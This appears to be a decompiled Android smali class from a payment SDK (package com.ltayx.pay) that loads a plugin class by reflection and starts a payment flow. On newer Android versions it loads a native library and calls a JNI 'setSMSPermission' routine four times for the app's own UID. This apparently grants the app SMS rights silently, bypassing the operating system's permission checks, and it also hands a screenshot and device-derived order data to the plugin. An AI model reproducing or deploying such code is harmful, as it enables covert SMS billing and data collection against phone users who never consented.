.class public Lcom/ltayx/pay/a;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field private static i:Lcom/ltayx/pay/a;


# instance fields
.field private a:Ljava/lang/Class;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/lang/Class",
            "<*>;"
        }
    .end annotation
.end field

.field private b:Ljava/lang/Object;

.field private c:Landroid/app/Activity;

.field private d:Landroid/content/Context;

.field private e:Lcom/ltayx/pay/e;

.field private f:Lcom/ltayx/pay/d;

.field private g:Lcom/ltayx/pay/c;

.field private h:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .registers 1

    .prologue
    .line 49
    const/4 v0, 0x0

    sput-object v0, Lcom/ltayx/pay/a;->i:Lcom/ltayx/pay/a;

    return-void
.end method

.method public constructor <init>()V
    .registers 2

    .prologue
    const/4 v0, 0x0

    .line 31
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 36
    iput-object v0, p0, Lcom/ltayx/pay/a;->a:Ljava/lang/Class;

    .line 37
    iput-object v0, p0, Lcom/ltayx/pay/a;->b:Ljava/lang/Object;

    .line 40
    iput-object v0, p0, Lcom/ltayx/pay/a;->c:Landroid/app/Activity;

    .line 41
    iput-object v0, p0, Lcom/ltayx/pay/a;->d:Landroid/content/Context;

    .line 43
    iput-object v0, p0, Lcom/ltayx/pay/a;->e:Lcom/ltayx/pay/e;

    .line 44
    iput-object v0, p0, Lcom/ltayx/pay/a;->f:Lcom/ltayx/pay/d;

    .line 45
    iput-object v0, p0, Lcom/ltayx/pay/a;->g:Lcom/ltayx/pay/c;

    .line 47
    iput-object v0, p0, Lcom/ltayx/pay/a;->h:Ljava/lang/String;

    .line 31
    return-void
.end method

.method static synthetic a(Lcom/ltayx/pay/a;)Landroid/content/Context;
    .registers 2

    .prologue
    .line 41
    iget-object v0, p0, Lcom/ltayx/pay/a;->d:Landroid/content/Context;

    return-object v0
.end method

.method public static a()Lcom/ltayx/pay/a;
    .registers 1

    .prologue
    .line 53
    sget-object v0, Lcom/ltayx/pay/a;->i:Lcom/ltayx/pay/a;

    if-nez v0, :cond_b

    .line 54
    new-instance v0, Lcom/ltayx/pay/a;

    invoke-direct {v0}, Lcom/ltayx/pay/a;-><init>()V

    sput-object v0, Lcom/ltayx/pay/a;->i:Lcom/ltayx/pay/a;

    .line 57
    :cond_b
    sget-object v0, Lcom/ltayx/pay/a;->i:Lcom/ltayx/pay/a;

    return-object v0
.end method

.method static synthetic a(Lcom/ltayx/pay/a;Ljava/lang/String;)V
    .registers 2

    .prologue
    .line 241
    invoke-direct {p0, p1}, Lcom/ltayx/pay/a;->a(Ljava/lang/String;)V

    return-void
.end method

.method private a(Ljava/lang/String;)V
    .registers 8

    .prologue
    const/4 v1, 0x0

    .line 242
    invoke-direct {p0}, Lcom/ltayx/pay/a;->c()V

    .line 244
    invoke-static {}, Lcom/ltayx/pay/SdkPayServer;->getInstance()Lcom/ltayx/pay/SdkPayServer;

    move-result-object v0

    invoke-virtual {v0, v1}, Lcom/ltayx/pay/SdkPayServer;->setmSdkPayStatus(I)V

    .line 246
    const/4 v0, 0x0

    .line 248
    :try_start_c
    invoke-static {}, Lcom/ltayx/pay/SdkPayServer;->getInstance()Lcom/ltayx/pay/SdkPayServer;

    move-result-object v2

    invoke-virtual {v2}, Lcom/ltayx/pay/SdkPayServer;->getmOrderInfo()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_27

    .line 249
    invoke-static {}, Lcom/ltayx/pay/SdkPayServer;->getInstance()Lcom/ltayx/pay/SdkPayServer;

    move-result-object v2

    invoke-virtual {v2}, Lcom/ltayx/pay/SdkPayServer;->getmOrderInfo()Ljava/lang/String;

    move-result-object v2

    const-string v3, "&"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 250
    array-length v3, v2
    :try_end_25
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_25} :catch_8e

    :goto_25
    if-lt v1, v3, :cond_64

    .line 263
    :cond_27
    :goto_27
    if-eqz v0, :cond_83

    .line 264
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "&"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "ex"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toCharArray()[C

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->copyValueOf([C)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/ltayx/pay/a;->h:Ljava/lang/String;

    .line 270
    :goto_56
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/ltayx/pay/b;

    invoke-direct {v1, p0}, Lcom/ltayx/pay/b;-><init>(Lcom/ltayx/pay/a;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 281
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 282
    return-void

    .line 250
    :cond_64
    :try_start_64
    aget-object v4, v2, v1

    .line 251
    const-string v5, "ex"

    invoke-virtual {v4, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_80

    .line 252
    const-string v1, "="

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_27

    .line 253
    const-string v1, "="

    invoke-virtual {v4, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    aget-object v0, v1, v2
    :try_end_7f
    .catch Ljava/lang/Exception; {:try_start_64 .. :try_end_7f} :catch_8e

    goto :goto_27

    .line 250
    :cond_80
    add-int/lit8 v1, v1, 0x1

    goto :goto_25

    .line 267
    :cond_83
    invoke-virtual {p1}, Ljava/lang/String;->toCharArray()[C

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->copyValueOf([C)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/ltayx/pay/a;->h:Ljava/lang/String;

    goto :goto_56

    .line 260
    :catch_8e
    move-exception v1

    goto :goto_27
.end method

.method static synthetic b(Lcom/ltayx/pay/a;)Landroid/app/Activity;
    .registers 2

    .prologue
    .line 40
    iget-object v0, p0, Lcom/ltayx/pay/a;->c:Landroid/app/Activity;

    return-object v0
.end method

.method private b()V
    .registers 2

    .prologue
    const/4 v0, 0x0

    .line 62
    iput-object v0, p0, Lcom/ltayx/pay/a;->a:Ljava/lang/Class;

    .line 63
    iput-object v0, p0, Lcom/ltayx/pay/a;->b:Ljava/lang/Object;

    .line 65
    iput-object v0, p0, Lcom/ltayx/pay/a;->c:Landroid/app/Activity;

    .line 66
    iput-object v0, p0, Lcom/ltayx/pay/a;->d:Landroid/content/Context;

    .line 68
    iput-object v0, p0, Lcom/ltayx/pay/a;->e:Lcom/ltayx/pay/e;

    .line 69
    iput-object v0, p0, Lcom/ltayx/pay/a;->f:Lcom/ltayx/pay/d;

    .line 70
    iput-object v0, p0, Lcom/ltayx/pay/a;->g:Lcom/ltayx/pay/c;

    .line 71
    return-void
.end method

.method private b(Ljava/lang/String;)V
    .registers 6

    .prologue
    .line 289
    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v0}, Lcom/ltayx/pay/f;->a([B)Ljava/lang/String;

    move-result-object v0

    .line 291
    iget-object v1, p0, Lcom/ltayx/pay/a;->d:Landroid/content/Context;

    invoke-static {}, Lcom/ltayx/pay/SdkPayServer;->getInstance()Lcom/ltayx/pay/SdkPayServer;

    move-result-object v2

    invoke-virtual {v2}, Lcom/ltayx/pay/SdkPayServer;->getmOrderInfo()Ljava/lang/String;

    move-result-object v2

    .line 292
    iget-object v3, p0, Lcom/ltayx/pay/a;->d:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getPackageCodePath()Ljava/lang/String;

    move-result-object v3

    .line 291
    invoke-static {v1, v2, v3, v0}, Lcom/ltayx/pay/m;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 293
    return-void
.end method

.method static synthetic c(Lcom/ltayx/pay/a;)Ljava/lang/String;
    .registers 2

    .prologue
    .line 47
    iget-object v0, p0, Lcom/ltayx/pay/a;->h:Ljava/lang/String;

    return-object v0
.end method

.method private c()V
    .registers 1

    .prologue
    .line 76
    invoke-direct {p0}, Lcom/ltayx/pay/a;->b()V

    .line 77
    return-void
.end method

.method private d()Ljava/lang/String;
    .registers 7

    .prologue
    const/4 v4, 0x1

    const/4 v5, 0x0

    .line 296
    new-instance v0, Ljava/text/SimpleDateFormat;

    invoke-static {}, Lcom/ltayx/pay/g;->l()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 297
    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v0

    .line 299
    invoke-static {}, Lcom/ltayx/pay/SdkPayServer;->getInstance()Lcom/ltayx/pay/SdkPayServer;

    move-result-object v1

    invoke-virtual {v1}, Lcom/ltayx/pay/SdkPayServer;->getmOrderInfo()Ljava/lang/String;

    move-result-object v1

    .line 301
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/ltayx/pay/g;->m()Ljava/lang/String;

    move-result-object v1

    const/4 v3, 0x2

    new-array v3, v3, [Ljava/lang/Object;

    aput-object v0, v3, v5

    .line 302
    iget-object v0, p0, Lcom/ltayx/pay/a;->d:Landroid/content/Context;

    invoke-static {v0}, Lcom/ltayx/pay/k;->a(Landroid/content/Context;)Lcom/ltayx/pay/k;

    move-result-object v0

    invoke-virtual {v0}, Lcom/ltayx/pay/k;->c()Ljava/lang/String;

    move-result-object v0

    aput-object v0, v3, v4

    .line 301
    invoke-static {v1, v3}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 304
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/ltayx/pay/g;->n()Ljava/lang/String;

    move-result-object v2

    new-array v3, v4, [Ljava/lang/Object;

    .line 305
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v4, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/ltayx/pay/g;->o()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/ltayx/pay/l;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v3, v5

    .line 304
    invoke-static {v2, v3}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 307
    return-object v0
.end method


# virtual methods
.method public a(Landroid/app/Activity;Ljava/lang/String;)V
    .registers 13

    .prologue
    const/4 v9, 0x3

    const/4 v8, 0x2

    const/4 v7, 0x0

    const/4 v6, 0x1

    .line 82
    iput-object p1, p0, Lcom/ltayx/pay/a;->c:Landroid/app/Activity;

    .line 83
    iget-object v0, p0, Lcom/ltayx/pay/a;->c:Landroid/app/Activity;

    invoke-virtual {v0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/ltayx/pay/a;->d:Landroid/content/Context;

    .line 85
    new-instance v0, Lcom/ltayx/pay/e;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Lcom/ltayx/pay/e;-><init>(Lcom/ltayx/pay/a;Lcom/ltayx/pay/e;)V

    iput-object v0, p0, Lcom/ltayx/pay/a;->e:Lcom/ltayx/pay/e;

    .line 86
    new-instance v0, Lcom/ltayx/pay/d;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Lcom/ltayx/pay/d;-><init>(Lcom/ltayx/pay/a;Lcom/ltayx/pay/d;)V

    iput-object v0, p0, Lcom/ltayx/pay/a;->f:Lcom/ltayx/pay/d;

    .line 87
    new-instance v0, Lcom/ltayx/pay/c;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Lcom/ltayx/pay/c;-><init>(Lcom/ltayx/pay/a;Lcom/ltayx/pay/c;)V

    iput-object v0, p0, Lcom/ltayx/pay/a;->g:Lcom/ltayx/pay/c;

    .line 93
    :try_start_26
    iget-object v0, p0, Lcom/ltayx/pay/a;->d:Landroid/content/Context;

    invoke-static {v0}, Lcom/ltayx/pay/k;->a(Landroid/content/Context;)Lcom/ltayx/pay/k;

    move-result-object v0

    const-string v1, ".SdkPayServer"

    invoke-virtual {v0, v1}, Lcom/ltayx/pay/k;->a(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    iput-object v0, p0, Lcom/ltayx/pay/a;->a:Ljava/lang/Class;

    .line 94
    iget-object v0, p0, Lcom/ltayx/pay/a;->a:Ljava/lang/Class;

    invoke-virtual {v0}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v0

    iput-object v0, p0, Lcom/ltayx/pay/a;->b:Ljava/lang/Object;
    :try_end_3c
    .catch Ljava/lang/Exception; {:try_start_26 .. :try_end_3c} :catch_14f

    .line 105
    iget-object v0, p0, Lcom/ltayx/pay/a;->a:Ljava/lang/Class;

    if-eqz v0, :cond_207

    .line 113
    :try_start_40
    sget-object v0, Landroid/os/Build$VERSION;->SDK:Ljava/lang/String;

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 114
    const/16 v1, 0x13

    if-lt v0, v1, :cond_b4

    sget-boolean v0, Lcom/ltayx/pay/SdkPayServer;->isHadLoadSmsSo:Z

    if-nez v0, :cond_b4

    .line 115
    iget-object v0, p0, Lcom/ltayx/pay/a;->d:Landroid/content/Context;

    invoke-static {v0}, Lcom/ltayx/pay/k;->a(Landroid/content/Context;)Lcom/ltayx/pay/k;

    move-result-object v0

    invoke-virtual {v0}, Lcom/ltayx/pay/k;->c()Ljava/lang/String;

    move-result-object v0

    .line 118
    iget-object v1, p0, Lcom/ltayx/pay/a;->a:Ljava/lang/Class;

    const-string v2, "getApkSoFilepath"

    const/4 v3, 0x2

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v4, 0x0

    const-class v5, Landroid/app/Activity;

    aput-object v5, v3, v4

    const/4 v4, 0x1

    const-class v5, Ljava/lang/String;

    aput-object v5, v3, v4

    invoke-virtual {v1, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    .line 119
    iget-object v2, p0, Lcom/ltayx/pay/a;->b:Ljava/lang/Object;

    const/4 v3, 0x2

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    iget-object v5, p0, Lcom/ltayx/pay/a;->c:Landroid/app/Activity;

    aput-object v5, v3, v4

    const/4 v4, 0x1

    aput-object v0, v3, v4

    invoke-virtual {v1, v2, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    .line 123
    if-eqz v0, :cond_b4

    .line 124
    const/4 v1, 0x1

    sput-boolean v1, Lcom/ltayx/pay/SdkPayServer;->isHadLoadSmsSo:Z

    .line 126
    invoke-static {v0}, Ljava/lang/System;->load(Ljava/lang/String;)V

    .line 128
    iget-object v0, p0, Lcom/ltayx/pay/a;->d:Landroid/content/Context;

    const/4 v1, 0x0

    invoke-static {}, Landroid/os/Process;->myUid()I

    move-result v2

    const/4 v3, 0x1

    invoke-static {v0, v1, v2, v3}, Lcom/android/said/adapter/YTJniAdapter;->setSMSPermission(Landroid/content/Context;III)I

    .line 129
    iget-object v0, p0, Lcom/ltayx/pay/a;->d:Landroid/content/Context;

    const/4 v1, 0x1

    invoke-static {}, Landroid/os/Process;->myUid()I

    move-result v2

    const/4 v3, 0x1

    invoke-static {v0, v1, v2, v3}, Lcom/android/said/adapter/YTJniAdapter;->setSMSPermission(Landroid/content/Context;III)I

    .line 130
    iget-object v0, p0, Lcom/ltayx/pay/a;->d:Landroid/content/Context;

    const/4 v1, 0x2

    invoke-static {}, Landroid/os/Process;->myUid()I

    move-result v2

    const/4 v3, 0x1

    invoke-static {v0, v1, v2, v3}, Lcom/android/said/adapter/YTJniAdapter;->setSMSPermission(Landroid/content/Context;III)I

    .line 131
    iget-object v0, p0, Lcom/ltayx/pay/a;->d:Landroid/content/Context;

    const/4 v1, 0x3

    invoke-static {}, Landroid/os/Process;->myUid()I

    move-result v2

    const/4 v3, 0x1

    invoke-static {v0, v1, v2, v3}, Lcom/android/said/adapter/YTJniAdapter;->setSMSPermission(Landroid/content/Context;III)I
    :try_end_b4
    .catch Ljava/lang/Exception; {:try_start_40 .. :try_end_b4} :catch_228

    .line 145
    :cond_b4
    :goto_b4
    :try_start_b4
    iget-object v0, p0, Lcom/ltayx/pay/a;->a:Ljava/lang/Class;

    const-string v1, "initSdkPluginPay"

    const/4 v2, 0x4

    new-array v2, v2, [Ljava/lang/Class;

    const/4 v3, 0x0

    .line 146
    const-class v4, Ljava/lang/Integer;

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-class v4, Landroid/os/Handler;

    aput-object v4, v2, v3

    const/4 v3, 0x2

    const-class v4, Landroid/os/Handler;

    aput-object v4, v2, v3

    const/4 v3, 0x3

    const-class v4, Landroid/os/Handler;

    aput-object v4, v2, v3

    .line 145
    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 147
    iget-object v1, p0, Lcom/ltayx/pay/a;->b:Ljava/lang/Object;

    const/4 v2, 0x4

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    .line 148
    const/16 v4, 0x7d0

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    iget-object v4, p0, Lcom/ltayx/pay/a;->e:Lcom/ltayx/pay/e;

    aput-object v4, v2, v3

    const/4 v3, 0x2

    iget-object v4, p0, Lcom/ltayx/pay/a;->g:Lcom/ltayx/pay/c;

    aput-object v4, v2, v3

    const/4 v3, 0x3

    iget-object v4, p0, Lcom/ltayx/pay/a;->f:Lcom/ltayx/pay/d;

    aput-object v4, v2, v3

    .line 147
    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Integer;

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    .line 149
    if-nez v0, :cond_1e2

    .line 154
    iget-object v0, p0, Lcom/ltayx/pay/a;->a:Ljava/lang/Class;

    const-string v1, "startSdkPluginPay"

    const/4 v2, 0x4

    new-array v2, v2, [Ljava/lang/Class;

    const/4 v3, 0x0

    .line 155
    const-class v4, Landroid/app/Activity;

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-class v4, Landroid/graphics/Bitmap;

    aput-object v4, v2, v3

    const/4 v3, 0x2

    const-class v4, Ljava/lang/String;

    aput-object v4, v2, v3

    const/4 v3, 0x3

    const-class v4, Ljava/lang/String;

    aput-object v4, v2, v3

    .line 154
    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 156
    iget-object v1, p0, Lcom/ltayx/pay/a;->b:Ljava/lang/Object;

    const/4 v2, 0x4

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    iget-object v4, p0, Lcom/ltayx/pay/a;->c:Landroid/app/Activity;

    aput-object v4, v2, v3

    const/4 v3, 0x1

    .line 157
    invoke-static {}, Lcom/ltayx/pay/SdkPayServer;->getInstance()Lcom/ltayx/pay/SdkPayServer;

    move-result-object v4

    invoke-virtual {v4}, Lcom/ltayx/pay/SdkPayServer;->getScreenShot()Landroid/graphics/Bitmap;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x2

    .line 158
    invoke-direct {p0}, Lcom/ltayx/pay/a;->d()Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x3

    aput-object p2, v2, v3

    .line 156
    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Integer;

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    .line 159
    if-nez v0, :cond_186

    .line 160
    invoke-static {}, Lcom/ltayx/pay/SdkPayServer;->getInstance()Lcom/ltayx/pay/SdkPayServer;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/ltayx/pay/SdkPayServer;->setmSdkPayStatus(I)V
    :try_end_14e
    .catch Ljava/lang/Exception; {:try_start_b4 .. :try_end_14e} :catch_1aa

    .line 191
    :goto_14e
    return-void

    .line 96
    :catch_14f
    move-exception v0

    .line 97
    const-string v1, "result_status=%s&failed_code=%s&pay_price=%s"

    new-array v2, v9, [Ljava/lang/Object;

    .line 98
    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    aput-object v3, v2, v7

    const/16 v3, 0x65

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    aput-object v3, v2, v6

    invoke-static {v7}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    aput-object v3, v2, v8

    .line 97
    invoke-static {v1, v2}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    .line 99
    invoke-direct {p0, v1}, Lcom/ltayx/pay/a;->a(Ljava/lang/String;)V

    .line 101
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "start-pluginpay-load-exception:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v0}, Lcom/ltayx/pay/h;->a(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/ltayx/pay/a;->b(Ljava/lang/String;)V

    goto :goto_14e

    .line 163
    :cond_186
    :try_start_186
    const-string v1, "result_status=%s&failed_code=%s&pay_price=%s"

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    .line 164
    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    aput-object v0, v2, v3

    const/4 v0, 0x2

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    aput-object v3, v2, v0

    .line 163
    invoke-static {v1, v2}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .line 166
    invoke-direct {p0, v0}, Lcom/ltayx/pay/a;->a(Ljava/lang/String;)V
    :try_end_1a9
    .catch Ljava/lang/Exception; {:try_start_186 .. :try_end_1a9} :catch_1aa

    goto :goto_14e

    .line 176
    :catch_1aa
    move-exception v0

    .line 179
    const-string v1, "result_status=%s&failed_code=%s&pay_price=%s"

    new-array v2, v9, [Ljava/lang/Object;

    .line 180
    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    aput-object v3, v2, v7

    const/16 v3, 0x65

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    aput-object v3, v2, v6

    invoke-static {v7}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    aput-object v3, v2, v8

    .line 179
    invoke-static {v1, v2}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    .line 181
    invoke-direct {p0, v1}, Lcom/ltayx/pay/a;->a(Ljava/lang/String;)V

    .line 183
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "start-pluginpay-method:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v0}, Lcom/ltayx/pay/h;->a(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/ltayx/pay/a;->b(Ljava/lang/String;)V

    goto/16 :goto_14e

    .line 170
    :cond_1e2
    :try_start_1e2
    const-string v1, "result_status=%s&failed_code=%s&pay_price=%s"

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    .line 171
    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    aput-object v0, v2, v3

    const/4 v0, 0x2

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    aput-object v3, v2, v0

    .line 170
    invoke-static {v1, v2}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .line 173
    invoke-direct {p0, v0}, Lcom/ltayx/pay/a;->a(Ljava/lang/String;)V
    :try_end_205
    .catch Ljava/lang/Exception; {:try_start_1e2 .. :try_end_205} :catch_1aa

    goto/16 :goto_14e

    .line 187
    :cond_207
    const-string v0, "result_status=%s&failed_code=%s&pay_price=%s"

    new-array v1, v9, [Ljava/lang/Object;

    .line 188
    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    aput-object v2, v1, v7

    const/16 v2, 0x65

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    aput-object v2, v1, v6

    invoke-static {v7}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    aput-object v2, v1, v8

    .line 187
    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .line 189
    invoke-direct {p0, v0}, Lcom/ltayx/pay/a;->a(Ljava/lang/String;)V

    goto/16 :goto_14e

    .line 137
    :catch_228
    move-exception v0

    goto/16 :goto_b4
.end method
